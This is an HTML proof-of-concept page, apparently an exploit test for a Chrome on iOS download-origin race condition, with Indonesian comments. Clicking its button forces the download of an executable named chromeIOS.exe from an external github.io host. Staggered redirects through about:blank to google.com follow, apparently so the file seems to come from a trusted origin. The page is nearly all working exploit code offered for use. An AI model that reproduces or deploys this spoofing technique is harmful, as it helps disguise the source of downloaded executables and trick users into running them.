<!doctype html>
<html>
<head>
<meta charset="utf-8">

<style>
.button{
  background:#4CAF50;
  border:none;
  color:white;
  padding:16px 32px;
  font-size:16px;
  cursor:pointer;
}
</style>

<script>

const FILE_URL="https://ecdnts-del.github.io/test-apk/chromeIOS.exe";

function startExploit(){

  console.log("Starting race condition test");

  triggerDownload();

  // banyak timing untuk memperbesar peluang race
  const delays=[120,180,220,260,300,320,350,380,420];

  delays.forEach((d,i)=>{
    setTimeout(()=>{
      redirectChain();
    },d);
  });

}

function triggerDownload(){

  const link=document.createElement("a");
  link.href=FILE_URL;
  link.download="chromeIOS.exe";

  document.body.appendChild(link);

  // trigger click async
  requestAnimationFrame(()=>{
    link.click();
    document.body.removeChild(link);
  });

}

function redirectChain(){

  console.log("Redirect step");

  // redirect bertahap untuk mengacaukan state navigation
  location.href="about:blank";

  setTimeout(()=>{
    location.replace("https://google.com");
  },40);

}

</script>

</head>

<body>

<center>

<h2>Chrome iOS Download Origin Race Test</h2>

<br>

<button class="button" onclick="startExploit()">
Start Download
</button>

</center>

</body>
</html>
